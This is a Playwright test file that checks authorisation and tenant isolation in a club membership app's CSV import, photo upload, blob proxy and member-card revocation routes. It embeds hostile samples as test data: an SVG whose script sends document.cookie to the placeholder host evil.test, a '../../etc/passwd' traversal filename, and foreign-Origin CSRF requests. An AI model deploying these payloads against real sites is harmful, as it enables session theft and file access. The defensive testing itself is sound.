/**
 * Lane L-C — J24 (CSV import), J27 (photos and the blob proxy), J28 (the card
 * sheet), J29 (revoking a card).
 *
 * Allow-lists read from the routes:
 *   POST admin/import/upload           → requireApiOwner (upload/route.ts:61)
 *   POST admin/import/[id]/preview     → requireApiOwner (preview/route.ts:16)
 *   POST admin/import/[id]/commit      → requireApiOwner (commit/route.ts:23)
 *   GET  admin/import/[id]             → requireApiOwner ([id]/route.ts:10)
 *     ⇒ the manifest records J24 as owner+manager. A MANAGER IS REFUSED.
 *   POST upload                        → STAFF_ROLES, or the member themself
 *                                        (upload/route.ts:41, :91-132)
 *   GET  blob-image                    → ANY session in the tenant, gated only
 *                                        on the `/tenants/<tenantId>/` path
 *                                        prefix (blob-image/route.ts:68-84).
 *                                        There is no per-MEMBER check.
 *   POST members/[id]/photos, DELETE   → STAFF_ROLES (photos/route.ts:12)
 *   POST members/[id]/card/revoke      → requireApiStaff (revoke/route.ts:44)
 *   /print/member-cards                → requireStaff (page.tsx:52)
 *
 * Rule 6: no seeded member's card is ever revoked here. Every card touched is
 * a run-stamped row this lane minted and tears down.
 */
import { test, expect, type APIRequestContext } from "@playwright/test";
import { sql, RUN_STAMP, seededTenantId } from "../helpers/db";
import { readCardToken } from "../helpers/qr";
import {
  OWNER_A, COACH_A, ADMIN_A, MEMBER_A, PASSWORD_A, THROWAWAY_PASSWORD,
  sessionFor, anonContext, closeSessions, createThrowawayStaff, createThrowawayTenant,
  teardownThrowawayTenant, teardownThrowawayStaff, countOf, assertUnchanged, apiCall,
  assertNoOverflowLc, finalUrlAfterGoto, clearBucket, makeMember, makePhoto, teardownLc, hashed, ANON_REFUSED,
  teardownImportJobs, type LcMember, type ThrowawayTenant,
} from "./lc-shared";

test.describe.configure({ mode: "default", timeout: 180_000 });

const ORIGIN = process.env.E2E_BASE_URL ?? "http://localhost:3847";

/** A 1x1 PNG, magic bytes and all — upload/route.ts:181 sniffs the content. */
const PNG_1X1 = Buffer.from(
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==",
  "base64",
);
/** An SVG carrying a script — must never be accepted as a member photo. */
const EVIL_SVG = Buffer.from(
  `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("//evil.test?c="+document.cookie)</script></svg>`,
);

let tenantA: string;
let tenantB: ThrowawayTenant;
let managerEmail: string;
let cardHolder: LcMember;

test.beforeAll(async () => {
  tenantA = await seededTenantId();
  tenantB = await createThrowawayTenant();
  managerEmail = (await createThrowawayStaff("manager")).email;
  cardHolder = await makeMember({ tag: "card" });
});

test.afterAll(async () => {
  await clearBucket("member:");
  await teardownImportJobs();
  await teardownLc();
  await teardownThrowawayTenant(tenantB).catch(() => {});
  await teardownThrowawayStaff().catch(() => {});
  await closeSessions();
});

function csv(rows: string[]): string {
  return ["name,email,phone", ...rows].join("\n");
}

// ─────────────────────────────────────────────────────────────────────────────
test.describe("J24 — CSV import", () => {
  test("the whole import pipeline is OWNER-ONLY — a manager, a coach and an admin are all refused", async ({ browser, baseURL }) => {
    const beforeJobs = await countOf("ImportJob", '"tenantId" = $1', [tenantA]);
    for (const [role, email, password] of [
      ["manager", managerEmail, THROWAWAY_PASSWORD],
      ["coach", COACH_A, PASSWORD_A],
      ["admin", ADMIN_A, PASSWORD_A],
    ] as [string, string, string][]) {
      const ctx = await sessionFor(browser, baseURL!, { email, password });
      const res = await ctx.request.fetch("/api/admin/import/upload", {
        method: "POST",
        headers: { Origin: ORIGIN },
        multipart: {
          source: "generic",
          file: { name: `${RUN_STAMP}-${role}.csv`, mimeType: "text/csv", buffer: Buffer.from(csv([`A,${RUN_STAMP}-a@example.test,`])) },
        },
      });
      expect(res.status(), `${role} POST admin/import/upload — the manifest says owner+manager`).toBe(403);
      const body = await res.json().catch(() => ({}));
      expect((body as { ok?: boolean }).ok, "api-authz shape").toBe(false);
    }
    await assertUnchanged("ImportJob", beforeJobs, '"tenantId" = $1', [tenantA]);

    // A member, and no session at all.
    const memberCtx = await sessionFor(browser, baseURL!, { email: MEMBER_A, viewport: { width: 390, height: 844 }, isMobile: true });
    const anon = await anonContext(browser, baseURL!);
    for (const [label, rc, want] of [["member", memberCtx.request, 403], ["anonymous", anon.request, 401]] as [string, APIRequestContext, number][]) {
      const r = await rc.fetch("/api/admin/import/upload", {
        method: "POST", headers: { Origin: ORIGIN },
        multipart: { source: "generic", file: { name: `${RUN_STAMP}.csv`, mimeType: "text/csv", buffer: Buffer.from(csv([])) } },
      });
      if (want === 403) expect(r.status(), `${label} POST admin/import/upload`).toBe(403);
      else expect(ANON_REFUSED, `${label} POST admin/import/upload`).toContain(r.status());
    }
    await assertUnchanged("ImportJob", beforeJobs, '"tenantId" = $1', [tenantA]);
    await anon.close();

    // And the screen. Round 1 correction: there is no `/dashboard/members/import`
    // route — the importer is the `ImportPanel` inside the settings screen's
    // Integrations tab, so the first run navigated to a 404 and the assertion
    // passed on the wrong thing. Drive the real surface instead.
    const mgr = await sessionFor(browser, baseURL!, { email: managerEmail, password: THROWAWAY_PASSWORD, viewport: { width: 768, height: 1024 }, isMobile: false });
    const mgrPage = await mgr.newPage();
    await mgrPage.goto("/dashboard/settings", { waitUntil: "domcontentloaded" });
    await mgrPage.waitForLoadState("networkidle").catch(() => {});
    const mgrText = await mgrPage.locator("body").innerText().catch(() => "");
    expect(
      mgrText,
      "a manager must not be shown a CSV importer whose upload, preview and commit are all requireApiOwner",
    ).not.toMatch(/member csv import/i);
    await mgrPage.close();

    // …and the owner still has it, so the gate hid the control rather than
    // deleting the feature.
    const own = await sessionFor(browser, baseURL!, { email: OWNER_A, password: PASSWORD_A, viewport: { width: 768, height: 1024 }, isMobile: false });
    const ownPage = await own.newPage();
    await ownPage.goto("/dashboard/settings", { waitUntil: "domcontentloaded" });
    await ownPage.waitForLoadState("networkidle").catch(() => {});
    const ownText = await ownPage.locator("body").innerText().catch(() => "");
    expect(ownText, "the owner keeps the importer").toMatch(/member csv import|integrations/i);
    await ownPage.close();
  });

  test("upload → preview → commit as the owner, a bad row reported by line, a second commit refused", async ({ browser, baseURL }) => {
    test.setTimeout(300_000);
    const ctx = await sessionFor(browser, baseURL!, { email: OWNER_A });
    const rc = ctx.request;

    const good1 = `${RUN_STAMP}-imp1@example.test`;
    const good2 = `${RUN_STAMP}-imp2@example.test`;
    const file = csv([
      `Campaign Import One,${good1},+44 7700 900001`,
      `,,`,                          // line 3: no name, no email
      `Campaign Import Bad,not-an-email,`, // line 4: malformed address
      `Campaign Import Two,${good2},`,
    ]);

    const up = await rc.fetch("/api/admin/import/upload", {
      method: "POST", headers: { Origin: ORIGIN },
      multipart: { source: "generic", file: { name: `${RUN_STAMP}-import.csv`, mimeType: "text/csv", buffer: Buffer.from(file) } },
    });
    // No BLOB_READ_WRITE_TOKEN in .env.test answers 503 by design
    // (upload/route.ts:60). That is a named blocker, not a failure to drive.
    test.skip(up.status() === 503, "UNCOVERED — needs a live Vercel Blob store (BLOB_READ_WRITE_TOKEN)");
    expect(up.status(), "owner upload").toBe(201);
    const job = (await up.json()) as { id: string; fileBlobUrl?: string };
    expect(job.fileBlobUrl, "the private CSV URL is never returned to the client (publicJobView)").toBeUndefined();

    const jobRow = await sql<{ status: string; fileBlobUrl: string }>('SELECT status, "fileBlobUrl" FROM "ImportJob" WHERE id = $1', [job.id]);
    expect(jobRow, "the job is a row").toHaveLength(1);
    expect(jobRow[0].fileBlobUrl, "member PII lands in the tenant's own blob namespace").toContain(`/tenants/${tenantA}/`);

    // Preview reads the PRIVATE blob through head().downloadUrl — the pattern
    // that replaced the 403 this route used to answer.
    const prev = await apiCall(rc, "post", `/api/admin/import/${job.id}/preview`, ORIGIN, {});
    expect(prev.status, "preview reads the private blob").toBe(200);
    const preview = JSON.stringify(prev.body);
    expect(preview, "the bad rows are reported BY LINE, not as a count").toMatch(/"?(line|row)"?\s*[:=]\s*[34]/i);

    const beforeMembers = await countOf("Member", '"tenantId" = $1', [tenantA]);
    const commit = await apiCall(rc, "post", `/api/admin/import/${job.id}/commit`, ORIGIN, {});
    expect(commit.status, "owner commit").toBe(200);
    const imported = await sql<{ email: string }>('SELECT email FROM "Member" WHERE email IN ($1, $2)', [good1, good2]);
    expect(imported.map((r) => r.email).sort(), "the two good rows are rows").toEqual([good1, good2].sort());
    const afterMembers = await countOf("Member", '"tenantId" = $1', [tenantA]);
    expect(afterMembers - beforeMembers, "and the two bad rows are NOT").toBe(2);

    const again = await apiCall(rc, "post", `/api/admin/import/${job.id}/commit`, ORIGIN, {});
    expect(again.status, "commit/route.ts:33 — a second commit is refused").toBe(409);
    expect(await countOf("Member", '"tenantId" = $1', [tenantA]), "…and imports nothing").toBe(afterMembers);

    // The terminal state, for the "dies mid-way leaves running" record.
    const final = await sql<{ status: string; processedRows: number; importedRows: number; skippedRows: number }>(
      'SELECT status, "processedRows", "importedRows", "skippedRows" FROM "ImportJob" WHERE id = $1', [job.id]);
    expect(final[0].status, "a finished job is not left 'running'").toBe("complete");
    expect(final[0].importedRows).toBe(2);
    expect(final[0].skippedRows, "the skipped rows are counted, not swallowed").toBeGreaterThanOrEqual(2);
  });

  test("a foreign job id, a ../ filename, a 20 MB file and a non-CSV are each refused", async ({ browser, baseURL }) => {
    const ctx = await sessionFor(browser, baseURL!, { email: OWNER_A });
    const rc = ctx.request;

    // Tenant B's import job, reached from tenant A.
    const bJob = await sql<{ id: string }>(
      `INSERT INTO "ImportJob" ("id","tenantId","source","originalFilename","fileBlobUrl","status","createdAt")
       VALUES (gen_random_uuid()::text, $1, 'generic', $2, $3, 'pending', now()) RETURNING id`,
      [tenantB.id, `${RUN_STAMP}-b.csv`, `https://x.blob.vercel-storage.com/tenants/${tenantB.id}/imports/${RUN_STAMP}.csv`],
    );
    for (const [verb, path] of [["get", ""], ["post", "/preview"], ["post", "/commit"]] as ["get" | "post", string][]) {
      const r = await apiCall(rc, verb, `/api/admin/import/${bJob[0].id}${path}`, ORIGIN, verb === "post" ? {} : undefined);
      expect(r.status, `tenant A at tenant B's job${path || " (GET)"} — 404, never a 403 that confirms it exists`).toBe(404);
    }
    const bStill = await sql<{ status: string }>('SELECT status FROM "ImportJob" WHERE id = $1', [bJob[0].id]);
    expect(bStill[0].status, "tenant B's job was not started").toBe("pending");

    const bad: [string, string, string, Buffer, number][] = [
      ["a ../ filename", "../../etc/passwd.csv", "text/csv", Buffer.from(csv([])), 201],
      ["a non-CSV", `${RUN_STAMP}.png`, "image/png", PNG_1X1, 400],
      ["a 20 MB file", `${RUN_STAMP}-big.csv`, "text/csv", Buffer.alloc(20 * 1024 * 1024, 65), 400],
    ];
    for (const [label, name, mime, buffer, want] of bad) {
      const r = await rc.fetch("/api/admin/import/upload", {
        method: "POST", headers: { Origin: ORIGIN },
        multipart: { source: "generic", file: { name, mimeType: mime, buffer } },
      });
      if (r.status() === 503) { test.skip(true, "UNCOVERED — needs a live Vercel Blob store"); return; }
      expect(r.status(), `upload with ${label}`).toBe(want);
      if (want === 201) {
        const created = (await r.json()) as { id: string };
        const row = await sql<{ fileBlobUrl: string }>('SELECT "fileBlobUrl" FROM "ImportJob" WHERE id = $1', [created.id]);
        expect(row[0].fileBlobUrl, "a ../ filename must not escape the tenant namespace").toContain(`/tenants/${tenantA}/`);
        expect(new URL(row[0].fileBlobUrl).pathname, "…nor appear as a traversal in the stored path").not.toContain("..");
      }
    }

    // An invalid source, and a missing file.
    const noFile = await rc.fetch("/api/admin/import/upload", { method: "POST", headers: { Origin: ORIGIN }, multipart: { source: "generic" } });
    expect([400, 503]).toContain(noFile.status());
    const badSource = await rc.fetch("/api/admin/import/upload", {
      method: "POST", headers: { Origin: ORIGIN },
      multipart: { source: "../../evil", file: { name: `${RUN_STAMP}.csv`, mimeType: "text/csv", buffer: Buffer.from(csv([])) } },
    });
    expect([400, 503]).toContain(badSource.status());
  });

  test("the import upload is a multipart route, so a missing and a foreign Origin are both 403", async ({ browser, baseURL }) => {
    const ctx = await sessionFor(browser, baseURL!, { email: OWNER_A });
    const before = await countOf("ImportJob", '"tenantId" = $1', [tenantA]);
    const mp = { source: "generic", file: { name: `${RUN_STAMP}-csrf.csv`, mimeType: "text/csv", buffer: Buffer.from(csv([])) } };

    const noOrigin = await ctx.request.fetch("/api/admin/import/upload", { method: "POST", multipart: mp });
    expect(noOrigin.status(), "missing Origin on a formData() route").toBe(403);
    const foreign = await ctx.request.fetch("/api/admin/import/upload", { method: "POST", headers: { Origin: "http://evil.test" }, multipart: mp });
    expect(foreign.status(), "foreign Origin").toBe(403);
    const matched = await ctx.request.fetch("/api/admin/import/upload", { method: "POST", headers: { Origin: "http://evil.test", Host: "evil.test" }, multipart: mp });
    // HELD by construction: no browser, no victim cookie. Record the status.
    expect([403, 201, 503]).toContain(matched.status());
    if (matched.status() !== 201) await assertUnchanged("ImportJob", before, '"tenantId" = $1', [tenantA]);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
test.describe("J27 — photos and the blob proxy", () => {
  test("an SVG carrying a script and a 20 MB image are refused by every upload door", async ({ browser, baseURL }) => {
    const ctx = await sessionFor(browser, baseURL!, { email: OWNER_A });
    const rc = ctx.request;
    const subject = await makeMember({ tag: "photo" });
    const before = await countOf("MemberPhoto", '"memberId" = $1', [subject.id]);

    const svg = await rc.fetch("/api/upload", {
      method: "POST", headers: { Origin: ORIGIN },
      multipart: { memberId: subject.id, file: { name: "x.svg", mimeType: "image/svg+xml", buffer: EVIL_SVG } },
    });
    expect(svg.status(), "upload/route.ts:176 — SVG is not on ALLOWED_TYPES").toBe(400);

    // …and the same bytes wearing a PNG label: the route sniffs the content.
    const liar = await rc.fetch("/api/upload", {
      method: "POST", headers: { Origin: ORIGIN },
      multipart: { memberId: subject.id, file: { name: "x.png", mimeType: "image/png", buffer: EVIL_SVG } },
    });
    expect(liar.status(), "upload/route.ts:181 — the declared type must match the bytes").toBe(400);

    const big = await rc.fetch("/api/upload", {
      method: "POST", headers: { Origin: ORIGIN },
      multipart: { memberId: subject.id, file: { name: "big.png", mimeType: "image/png", buffer: Buffer.concat([PNG_1X1, Buffer.alloc(20 * 1024 * 1024)]) } },
    });
    expect(big.status(), "a 20 MB image").toBe(400);

    await assertUnchanged("MemberPhoto", before, '"memberId" = $1', [subject.id]);
  });

  test("blob-image serves any blob in the tenant's namespace to ANY member of it", async ({ browser, baseURL }) => {
    // Two unrelated members of the seeded club.
    const subject = await makeMember({ tag: "blobsubject" });
    const photo = await makePhoto(subject, "profile");
    const snooper = await makeMember({ tag: "snooper", passwordHash: hashed("Campaign!2026aA") });
    await sql('UPDATE "Member" SET "onboardingCompleted" = true, "waiverAccepted" = true WHERE id = $1', [snooper.id]);

    const anon = await anonContext(browser, baseURL!);
    const anonRes = await apiCall(anon.request, "get", `/api/blob-image?url=${encodeURIComponent(photo.url)}`, ORIGIN);
    expect(ANON_REFUSED, "no session — blob-image/route.ts:57").toContain(anonRes.status);
    await anon.close();

    const snoopCtx = await sessionFor(browser, baseURL!, { email: snooper.email, password: "Campaign!2026aA", viewport: { width: 390, height: 844 }, isMobile: true });
    const snoopRes = await apiCall(snoopCtx.request, "get", `/api/blob-image?url=${encodeURIComponent(photo.url)}`, ORIGIN);

    // The boundary this route enforces is the TENANT namespace prefix, and
    // nothing else. A 403 means "not your namespace" and is the only refusal
    // it can give; a 404 or a 502 means the authorisation PASSED and the
    // request reached the blob store. So a non-403 here is the finding: one
    // member may fetch another member's photo — and the same holds for the
    // import CSV, which lands at /tenants/<tenantId>/imports/… (proved above).
    expect(
      snoopRes.status,
      `an unrelated member reached another member's photo URL (got ${snoopRes.status}; 403 would mean the boundary held)`,
    ).toBe(403);

    // The other half: a blob from ANOTHER club really is refused.
    const bSubject = await makeMember({ tag: "bblob", tenantId: tenantB.id });
    const bPhoto = await makePhoto(bSubject);
    const own = await sessionFor(browser, baseURL!, { email: OWNER_A });
    const cross = await apiCall(own.request, "get", `/api/blob-image?url=${encodeURIComponent(bPhoto.url)}`, ORIGIN);
    expect(cross.status, "another club's blob").toBe(403);

    // A URL outside the blob host, and one with no tenant prefix.
    for (const [label, url, want] of [
      ["a non-blob host", "https://evil.test/tenants/x/y.png", 400],
      ["no tenant prefix", "https://x.public.blob.vercel-storage.com/loose.png", 403],
      ["a traversal", `https://x.public.blob.vercel-storage.com/tenants/${tenantA}/../${tenantB.id}/y.png`, 403],
      ["no url at all", "", 400],
    ] as [string, string, number][]) {
      const r = await apiCall(own.request, "get", `/api/blob-image?url=${encodeURIComponent(url)}`, ORIGIN);
      expect(r.status, `blob-image with ${label}`).toBe(want);
    }
  });

  test("members/[id]/photos is staff-wide, and a foreign member id is a 404", async ({ browser, baseURL }) => {
    const subject = await makeMember({ tag: "photolist" });
    await makePhoto(subject);
    for (const [role, email, password] of [
      ["coach", COACH_A, PASSWORD_A], ["admin", ADMIN_A, PASSWORD_A],
      ["manager", managerEmail, THROWAWAY_PASSWORD], ["owner", OWNER_A, PASSWORD_A],
    ] as [string, string, string][]) {
      const ctx = await sessionFor(browser, baseURL!, { email, password });
      const r = await apiCall(ctx.request, "get", `/api/members/${subject.id}/photos`, ORIGIN);
      expect(r.status, `${role} GET members/[id]/photos — photos/route.ts:12 is all four`).toBe(200);
    }

    const memberCtx = await sessionFor(browser, baseURL!, { email: MEMBER_A, viewport: { width: 390, height: 844 }, isMobile: true });
    const refused = await apiCall(memberCtx.request, "get", `/api/members/${subject.id}/photos`, ORIGIN);
    expect(refused.status, "a member at the staff photo route").toBe(403);
    expect(refused.text, "no URLs leak in the refusal").not.toContain("blob.vercel-storage.com");

    const bSubject = await makeMember({ tag: "bphoto", tenantId: tenantB.id });
    await makePhoto(bSubject);
    const own = await sessionFor(browser, baseURL!, { email: OWNER_A });
    const cross = await apiCall(own.request, "get", `/api/members/${bSubject.id}/photos`, ORIGIN);
    expect(cross.status, "tenant B's photos from tenant A").toBe(404);
    expect(cross.text).not.toContain(tenantB.id);
  });

  test("delete-orphan is scoped to the caller's own blobs", async ({ browser, baseURL }) => {
    const own = await sessionFor(browser, baseURL!, { email: OWNER_A });
    const foreignUrl = `https://x.public.blob.vercel-storage.com/tenants/${tenantB.id}/members/x/${RUN_STAMP}.png`;
    const res = await apiCall(own.request, "post", "/api/upload/delete-orphan", ORIGIN, { url: foreignUrl });
    expect(res.status, "another club's blob at delete-orphan (route.ts:74)").toBe(403);

    // A blob that a live row still points at must not be deletable as an orphan.
    const subject = await makeMember({ tag: "orphan" });
    const photo = await makePhoto(subject);
    const attached = await apiCall(own.request, "post", "/api/upload/delete-orphan", ORIGIN, { url: photo.url });
    expect(attached.status, "route.ts:103 — a referenced blob is not an orphan").toBe(409);
    const still = await sql('SELECT id FROM "MemberPhoto" WHERE id = $1', [photo.id]);
    expect(still, "the row survives the refusal").toHaveLength(1);

    const anon = await anonContext(browser, baseURL!);
    expect(ANON_REFUSED, "anonymous").toContain((await apiCall(anon.request, "post", "/api/upload/delete-orphan", ORIGIN, { url: photo.url })).status);
    await anon.close();
  });
});

// ─────────────────────────────────────────────────────────────────────────────
test.describe("J28 and J29 — the card sheet and revoking a card", () => {
  test("/print/member-cards opens for all four staff roles and redirects a member and an anonymous caller", async ({ browser, baseURL }) => {
    for (const [role, email, password, width] of [
      ["owner", OWNER_A, PASSWORD_A, 768],
      ["manager", managerEmail, THROWAWAY_PASSWORD, 768],
      ["coach", COACH_A, PASSWORD_A, 390],
      ["admin", ADMIN_A, PASSWORD_A, 768],
    ] as [string, string, string, number][]) {
      const ctx = await sessionFor(browser, baseURL!, { email, password, viewport: { width, height: 1024 }, isMobile: width === 390 });
      const page = await ctx.newPage();
      const landed = await finalUrlAfterGoto(page, `/print/member-cards?memberId=${cardHolder.id}`);
      expect(landed, `${role} at /print/member-cards (page.tsx:52 is requireStaff)`).toBe("/print/member-cards");
      await assertNoOverflowLc(page, width, `card sheet as ${role} at ${width}`);
      await page.close();
    }

    const memberCtx = await sessionFor(browser, baseURL!, { email: MEMBER_A, viewport: { width: 390, height: 844 }, isMobile: true });
    const mPage = await memberCtx.newPage();
    const mLanded = await finalUrlAfterGoto(mPage, "/print/member-cards");
    expect(mLanded, "a member is redirected, never shown a card sheet").not.toBe("/print/member-cards");
    await mPage.close();

    const anon = await anonContext(browser, baseURL!);
    const aPage = await anon.newPage();
    const aLanded = await finalUrlAfterGoto(aPage, "/print/member-cards");
    expect(aLanded, "anonymous is redirected to the login door").toMatch(/login|^\/$/);
    await aPage.close();
    await anon.close();
  });

  test("every mode renders, every QR decodes, and the token scans as the coach", async ({ browser, baseURL }) => {
    const own = await sessionFor(browser, baseURL!, { email: OWNER_A, viewport: { width: 768, height: 1024 }, isMobile: false });
    const page = await own.newPage();

    for (const mode of ["photo", "initials", "none"]) {
      for (const ink of ["colour", "mono"]) {
        await page.goto(`/print/member-cards?memberId=${cardHolder.id}&avatar=${mode}&ink=${ink}`, { waitUntil: "domcontentloaded" });
        await page.waitForLoadState("networkidle").catch(() => {});
        await assertNoOverflowLc(page, 768, `card sheet ${mode}/${ink}`);
        const qr = page.locator(`img[data-testid="qr-${cardHolder.id}"]`);
        await expect(qr, `${mode}/${ink}: the QR is on the card`).toBeVisible({ timeout: 30_000 });
      }
    }

    await page.goto(`/print/member-cards?memberId=${cardHolder.id}`, { waitUntil: "domcontentloaded" });
    await page.waitForLoadState("networkidle").catch(() => {});
    const token = await readCardToken(page, cardHolder.id);
    expect(token.length, "the QR really decodes to a token").toBeGreaterThan(10);
    await page.close();

    // The token scans as the coach — a card that prints but does not scan is
    // an advertised feature that cannot be reached.
    const coach = await sessionFor(browser, baseURL!, { email: COACH_A, password: PASSWORD_A });
    const scan = await apiCall(coach.request, "post", "/api/checkin/card", ORIGIN, { tokens: [token] });
    expect([200, 201, 402, 409], `the freshly printed token scanned: ${scan.status} ${scan.text.slice(0, 160)}`).toContain(scan.status);
    expect(scan.text, "the scan names the member it matched").toContain(cardHolder.name.split(" ")[0]);

    // Another club's member id on the print URL.
    const bMember = await makeMember({ tag: "bcard", tenantId: tenantB.id });
    const xPage = await own.newPage();
    await xPage.goto(`/print/member-cards?memberId=${bMember.id}`, { waitUntil: "domcontentloaded" });
    await xPage.waitForLoadState("networkidle").catch(() => {});
    const xText = await xPage.locator("body").innerText();
    expect(xText, "tenant B's member never appears on tenant A's card sheet").not.toContain(bMember.name);
    expect(xPage.locator(`img[data-testid="qr-${bMember.id}"]`), "…and no card is minted for them").toHaveCount(0);
    await xPage.close();
  });

  test("revoke is staff-wide, needs a reason, and a revoked token stops scanning", async ({ browser, baseURL }) => {
    // Rule 6: a run-stamped member, never a seeded one.
    const holder = await makeMember({ tag: "revoke" });
    const own = await sessionFor(browser, baseURL!, { email: OWNER_A, viewport: { width: 768, height: 1024 }, isMobile: false });
    const page = await own.newPage();
    await page.goto(`/print/member-cards?memberId=${holder.id}`, { waitUntil: "domcontentloaded" });
    await page.waitForLoadState("networkidle").catch(() => {});
    const oldToken = await readCardToken(page, holder.id);
    await page.close();

    // A reason under five characters, first.
    const short = await apiCall(own.request, "post", `/api/members/${holder.id}/card/revoke`, ORIGIN, { reason: "x" });
    expect(short.status, "revoke/route.ts:51 — an audit row that cannot say why is worth little").toBe(400);
    const v0 = await sql<{ cardVersion: number }>('SELECT "cardVersion" FROM "Member" WHERE id = $1', [holder.id]);
    expect(v0[0].cardVersion, "a refused revoke does not bump the version").toBe(1);

    // A member and an anonymous caller.
    const memberCtx = await sessionFor(browser, baseURL!, { email: MEMBER_A, viewport: { width: 390, height: 844 }, isMobile: true });
    const anon = await anonContext(browser, baseURL!);
    for (const [label, rc, want] of [["member", memberCtx.request, 403], ["anonymous", anon.request, 401]] as [string, APIRequestContext, number][]) {
      const r = await apiCall(rc, "post", `/api/members/${holder.id}/card/revoke`, ORIGIN, { reason: "campaign revoke attempt" });
      if (want === 403) expect(r.status, `${label} revoking a card`).toBe(403);
      else expect(ANON_REFUSED, `${label} revoking a card`).toContain(r.status);
    }
    const v1 = await sql<{ cardVersion: number }>('SELECT "cardVersion" FROM "Member" WHERE id = $1', [holder.id]);
    expect(v1[0].cardVersion, "…and neither of them bumped it").toBe(1);
    await anon.close();

    // The coach really may revoke — requireApiStaff, all four.
    const coach = await sessionFor(browser, baseURL!, { email: COACH_A, password: PASSWORD_A });
    const ok = await apiCall(coach.request, "post", `/api/members/${holder.id}/card/revoke`, ORIGIN, { reason: `lost at training ${RUN_STAMP}` });
    expect(ok.status, "coach POST members/[id]/card/revoke").toBe(200);
    const v2 = await sql<{ cardVersion: number }>('SELECT "cardVersion" FROM "Member" WHERE id = $1', [holder.id]);
    expect(v2[0].cardVersion, "revocation IS the version bump").toBe(2);
    await expect.poll(async () =>
      (await sql('SELECT id FROM "AuditLog" WHERE "entityId" = $1 AND action LIKE $2', [holder.id, "%card%"])).length,
      { timeout: 5_000 },
    ).toBeGreaterThan(0);

    // The old token no longer scans.
    const dead = await apiCall(coach.request, "post", "/api/checkin/card", ORIGIN, { tokens: [oldToken] });
    expect([400, 401, 403, 404, 409], `a revoked token answered ${dead.status}`).toContain(dead.status);
    expect(dead.text.toLowerCase(), "…and says why, rather than 'member not found'").toMatch(/revok|cancel|no longer|reissue|new card/);
    const attendance = await countOf("AttendanceRecord", '"memberId" = $1', [holder.id]);
    expect(attendance, "a revoked card checks nobody in").toBe(0);

    // The reprint scans.
    const rePage = await own.newPage();
    await rePage.goto(`/print/member-cards?memberId=${holder.id}`, { waitUntil: "domcontentloaded" });
    await rePage.waitForLoadState("networkidle").catch(() => {});
    const newToken = await readCardToken(rePage, holder.id);
    await rePage.close();
    expect(newToken, "the reprint carries a different token").not.toBe(oldToken);
    const alive = await apiCall(coach.request, "post", "/api/checkin/card", ORIGIN, { tokens: [newToken] });
    expect([200, 201, 402, 409], `the reprinted token answered ${alive.status}: ${alive.text.slice(0, 160)}`).toContain(alive.status);

    // Cross-tenant: another club's card token at our scan route.
    const bHolder = await makeMember({ tag: "bscan", tenantId: tenantB.id });
    const xRes = await apiCall(coach.request, "post", "/api/checkin/card", ORIGIN, { tokens: [oldToken.replace(/.$/, "z")] });
    expect([400, 401, 403, 404], "a mangled token is refused, never a 500").toContain(xRes.status);
    expect(await countOf("AttendanceRecord", '"memberId" = $1', [bHolder.id]), "nothing was written for tenant B").toBe(0);
  });
});
